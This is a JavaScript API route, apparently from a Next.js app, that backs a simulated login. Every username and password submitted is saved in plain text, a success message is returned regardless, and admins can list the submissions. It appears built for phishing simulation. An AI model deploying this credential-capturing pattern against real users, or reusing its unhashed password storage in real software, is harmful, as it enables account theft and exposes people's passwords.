import db from "../../lib/db";
import { verifyToken } from "../../lib/auth";

export default async function handler(req, res) {
  if (req.method === "GET") {
    const { authToken } = req.cookies;
    if (!authToken) {
      return res.status(401).json({ status: "error", message: "No autorizado" });
    }
    const decoded = verifyToken(authToken);
    if (!decoded || decoded.role !== "admin") {
      return res.status(401).json({ status: "error", message: "Sin permisos" });
    }
    const rows = db.prepare("SELECT id, username, flow, status, timestamp, server_timestamp FROM submissions ORDER BY id DESC").all();
    return res.status(200).json({ status: "ok", data: rows });
  }

  if (req.method !== "POST") {
    return res.status(405).json({ status: "error", message: "Solo POST permitido" });
  }

  const { username, password, flow = "LOGIN", timestamp } = req.body;
  if (!username || !password || !timestamp) {
    return res.status(400).json({ status: "error", message: "Faltan datos" });
  }

  const now = new Date().toISOString();
  const status = "ok";
  const message = "Inicio de sesión simulado exitoso";

  db.prepare("INSERT INTO submissions (username, password, flow, status, timestamp, server_timestamp) VALUES (?, ?, ?, ?, ?, ?)")
    .run(username, password, flow, status, timestamp, now);

  return res.status(200).json({ status, message, timestamp: now });
}
